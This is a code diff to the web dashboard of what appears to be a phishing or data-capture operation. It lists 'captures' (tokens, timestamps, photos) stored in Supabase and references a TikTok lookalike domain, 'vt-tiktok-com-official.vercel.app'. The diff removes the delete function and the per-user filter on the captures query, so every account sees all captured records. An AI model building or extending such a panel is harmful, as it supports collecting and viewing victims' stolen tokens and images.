@@ -243,21 +243,6 @@ body::before {
 }
 .btn-logout:hover { border-color: var(--red); color: var(--red); }
 
-.btn-delete {
-  padding: 5px 10px;
-  background: transparent;
-  border: 1px solid var(--red3);
-  color: var(--red2);
-  border-radius: 5px;
-  font-size: 11px;
-  cursor: pointer;
-  font-family: 'Inter', sans-serif;
-  transition: all 0.2s;
-  letter-spacing: 1px;
-  text-transform: uppercase;
-}
-.btn-delete:hover { background: rgba(220,38,38,0.15); border-color: var(--red); }
-
 /* DASHBOARD */
 .app-body { padding: 24px; max-width: 900px; margin: 0 auto; }
 
@@ -615,8 +600,6 @@ const WEBSITE1_URL = "https://vt-tiktok-com-official.vercel.app"; // URL website
 const { createClient } = supabase;
 const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-let currentUser = null;
-
 // ===== TOAST =====
 function showToast(msg, type = '') {
   const t = document.getElementById('toast');
@@ -679,7 +662,6 @@ async function handleRegister() {
 
 async function handleLogout() {
   await sb.auth.signOut();
-  currentUser = null;
   document.getElementById('appScreen').style.display = 'none';
   document.getElementById('authScreen').style.display = 'flex';
 }
@@ -692,7 +674,6 @@ sb.auth.onAuthStateChange((event, session) => {
 });
 
 function openApp(user) {
-  currentUser = user;
   document.getElementById('authScreen').style.display = 'none';
   document.getElementById('appScreen').style.display = 'block';
   document.getElementById('userBadge').textContent = user.email;
@@ -719,7 +700,6 @@ async function loadCaptures() {
   const { data, error } = await sb
     .from('captures')
     .select('*')
-    .eq('user_id', currentUser.id)
     .order('created_at', { ascending: false });
   
   if (error) {
@@ -770,10 +750,7 @@ function buildCard(c, i) {
         <div class="capture-id">#${tokenShort}</div>
         <div class="capture-time">${timeStr}</div>
       </div>
-      <div style="display:flex;align-items:center;gap:10px">
-        <button class="btn-delete" onclick="event.stopPropagation();deleteCapture('${c.id}', ${i})">Hapus</button>
-        <span class="capture-chevron">&#8964;</span>
-      </div>
+      <span class="capture-chevron">&#8964;</span>
     </div>
     <div class="capture-body">
       
@@ -860,17 +837,6 @@ function buildCard(c, i) {
 
 function toggleCard(i) {
   document.getElementById(`card-${i}`).classList.toggle('open');
-}
-
-async function deleteCapture(id, i) {
-  if (!confirm('Hapus data ini?')) return;
-  const { error } = await sb.from('captures').delete().eq('id', id);
-  if (error) { showToast('Gagal hapus: ' + error.message, 'error'); return; }
-  document.getElementById(`card-${i}`).remove();
-  showToast('Data berhasil dihapus', 'success');
-  // Update count
-  const remaining = document.querySelectorAll('.capture-card').length;
-  document.getElementById('captureCount').textContent = `// Total: ${remaining} tangkapan`;
 }
 
 function openPhoto(src) {
